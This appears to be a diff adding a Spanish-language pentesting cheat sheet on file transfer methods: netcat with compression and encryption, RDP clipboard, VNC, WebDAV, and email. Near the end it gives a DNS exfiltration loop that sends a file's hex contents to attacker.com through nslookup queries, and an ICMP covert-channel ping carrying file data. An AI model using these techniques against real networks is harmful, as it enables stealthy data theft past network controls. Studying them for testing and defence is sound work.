@@ -1,0 +1,112 @@
+# Miscellaneous File Transfer Methods
+
+Métodos adicionales para situaciones específicas.
+
+## Netcat (nc)
+
+### Transferencia básica
+
+**Receptor:**
+```bash
+nc -l -p 8000 > received_file
+```
+
+**Emisor:**
+```bash
+nc 192.168.1.100 8000 < file_to_send
+```
+
+### Con compresión
+
+**Receptor:**
+```bash
+nc -l -p 8000 | gunzip > received_file
+```
+
+**Emisor:**
+```bash
+gzip -c file_to_send | nc 192.168.1.100 8000
+```
+
+### Con encriptación
+
+**Receptor:**
+```bash
+nc -l -p 8000 | openssl enc -d -aes-256-cbc -pass pass:password > received_file
+```
+
+**Emisor:**
+```bash
+openssl enc -aes-256-cbc -pass pass:password -in file | nc 192.168.1.100 8000
+```
+
+## RDP Clipboard
+
+### Copiar archivos vía RDP
+
+1. Conectar por RDP
+2. Habilitar clipboard redirection
+3. Copiar/pegar archivos directamente
+
+```bash
+xfreerdp /u:user /p:pass /v:target /clipboard
+```
+
+## VNC
+
+```bash
+# Con file transfer habilitado
+vncviewer -shared -files file.txt 192.168.1.100:5900
+```
+
+## SMB over HTTP (WebDAV)
+
+```bash
+# Instalar wsgidav
+pip3 install wsgidav cheroot
+
+# Iniciar servidor
+wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+```
+
+**En Windows:**
+```cmd
+dir \\192.168.1.100\DavWWWRoot
+copy file.txt \\192.168.1.100\DavWWWRoot\
+```
+
+## DNS Exfiltration
+
+Para redes muy restrictivas:
+
+```bash
+# Codificar datos en consultas DNS
+dnsclass="abcdefghijklmnopqrstuvwxyz0123456789"
+for i in $(cat file.txt | xxd -p); do
+    nslookup $i.attacker.com
+done
+```
+
+## ICMP Exfiltration
+
+```bash
+# Enviar datos en paquetes ICMP
+ping -p $(cat file.txt | xxd -p | head -c 16) 192.168.1.100
+```
+
+## Email
+
+```bash
+# Enviar archivo por email
+echo "Attached file" | mail -s "File" -a file.txt user@example.com
+```
+
+## Resumen
+
+| Método | Puerto | Situación |
+|--------|--------|-----------|
+| Netcat | Any | Raw transfer |
+| RDP Clipboard | 3389 | GUI transfer |
+| WebDAV | 80/443 | SMB over HTTP |
+| DNS | 53 | Exfiltration |
+| ICMP | - | Covert channel |
